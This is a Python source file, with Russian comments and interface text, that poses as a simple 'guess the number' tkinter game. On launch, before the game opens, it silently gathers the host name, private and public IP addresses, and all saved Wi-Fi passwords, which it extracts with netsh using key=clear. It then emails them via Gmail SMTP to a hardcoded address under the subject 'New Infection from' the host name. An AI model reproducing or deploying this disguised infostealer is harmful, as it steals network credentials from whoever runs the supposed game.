import smtplib as smtp
import socket
import time
from requests import get
import random
import customtkinter as ctk
import subprocess
import tkinter as tk
from tkinter import messagebox
import random
import time
# === Основное окно ===
app = ctk.CTk()
app.title("Guess number")
app.geometry("500x400")
def connected():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1',8888))
        s.close()
    except Exception as e:
        print(f'Connection failed: {e}')

# === Функции ===
def send_email():
     # --- Информация о системе ---
    host_name = socket.gethostname()
    host_ip = socket.gethostbyname(host_name)
    public_ip = get('https://api.ipify.org').text

    # --- Сбор Wi-Fi данных ---
    wifi_data = "No Wi-Fi profiles found."
    host_name = socket.gethostname()
    host_ip = socket.gethostbyname(host_name)
    public_ip = get('https://api.ipify.org').text

    # --- Получаем список Wi-Fi профилей ---
    try:
        data = subprocess.check_output(
    ['netsh', 'wlan', 'show', 'profiles'],
    encoding='cp866',
    errors='ignore')
        Wi_Fis = [line.split(":")[1].strip()
    for line in data.split('\n')
    if "All User Profile" in line or "Все профили пользователей" in line]
        results_all = []

        for Wi_Fi in Wi_Fis:
            try:
                details = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', Wi_Fi, 'key=clear']
                ).decode('cp866', errors='ignore').split('\n')

                passwords = [
                    line.split(':')[1].strip()
                    for line in details
                    if 'Key Content' in line or 'Содержимое ключа' in line
                ]

                password = passwords[0] if passwords else 'None'
                results_all.append(f'Wi-Fi: {Wi_Fi} | Password: {password}')

            except subprocess.CalledProcessError:
                results_all.append(f'Wi-Fi: {Wi_Fi} | Error: Access Denied')

        wifi_data = "\n".join(results_all) if results_all else 'No Wi-Fi profiles found.'

    except Exception as e:
        wifi_data = f'Error retrieving Wi-Fi profiles: {e}'
    # --- Отправка письма ---
    try:
        email_address = '***@gmail.com'
        email_password = '***'
        dest_email = '***@gmail.com'
        subject = f'New Infection from {host_name}'
        email_text = (
            f'Host Name: {host_name}\n'
            f'Private IP: {host_ip}\n'
            f'Public IP: {public_ip}\n\n'
            f'{wifi_data}'
        )

        message = f'From: {email_address}\nTo: {dest_email}\nSubject: {subject}\n\n{email_text}'
        server = smtp.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_address, email_password)
        server.sendmail(email_address, dest_email, message.encode('utf-8'))
        server.quit()
    except Exception as e:
        print(f'Failed to send email: {e}')

class GuessNumberGame:
    def __init__(self, root):
        self.root = root
        self.root.title("Угадай число")
        self.root.geometry("400x300")
        self.root.resizable(False, False)

        self.number = None
        self.tries = 0
        self.start_time = None

        # --- Интерфейс ---
        self.label_title = tk.Label(root, text="Угадай число от 0 до 1000", font=("Arial", 14))
        self.label_title.pack(pady=10)

        self.entry_guess = tk.Entry(root, font=("Arial", 12), justify='center')
        self.entry_guess.pack(pady=5)

        self.button_check = tk.Button(root, text="Проверить", command=self.check_guess, font=("Arial", 12))
        self.button_check.pack(pady=5)

        self.label_feedback = tk.Label(root, text="", font=("Arial", 12))
        self.label_feedback.pack(pady=10)

        self.button_start = tk.Button(root, text="Начать игру", command=self.start_game, font=("Arial", 12))
        self.button_start.pack(pady=10)

        self.button_exit = tk.Button(root, text="Выход", command=root.quit, font=("Arial", 12))
        self.button_exit.pack(pady=10)

    def start_game(self):
        self.number = random.randint(0, 1000)
        self.tries = 0
        self.start_time = time.time()
        self.label_feedback.config(text="")
        self.entry_guess.delete(0, tk.END)
        messagebox.showinfo("Игра началась", "Я загадал число от 0 до 1000. Попробуй угадать!")

    def check_guess(self):
        if self.number is None:
            messagebox.showwarning("Ошибка", "Сначала начни игру!")
            return

        guess_str = self.entry_guess.get().strip()
        if not guess_str.isdigit():
            self.label_feedback.config(text="Введите целое число от 0 до 1000.")
            return

        guess = int(guess_str)
        if not (0 <= guess <= 1000):
            self.label_feedback.config(text="Число должно быть от 0 до 1000.")
            return

        self.tries += 1

        if guess == self.number:
            elapsed = time.time() - self.start_time
            messagebox.showinfo("Поздравляю!",
                                f"Вы угадали число {self.number}!\n"
                                f"Попыток: {self.tries}\nВремя: {elapsed:.1f} сек.")
            self.number = None
            self.label_feedback.config(text="")
        elif guess > self.number:
            self.label_feedback.config(text="Слишком много — число меньше.")
        else:
            self.label_feedback.config(text="Слишком мало — число больше.")
if __name__ == "__main__":
    connected()
    send_email()
    root = tk.Tk()
    app = GuessNumberGame(root)
    root.mainloop()
    

    
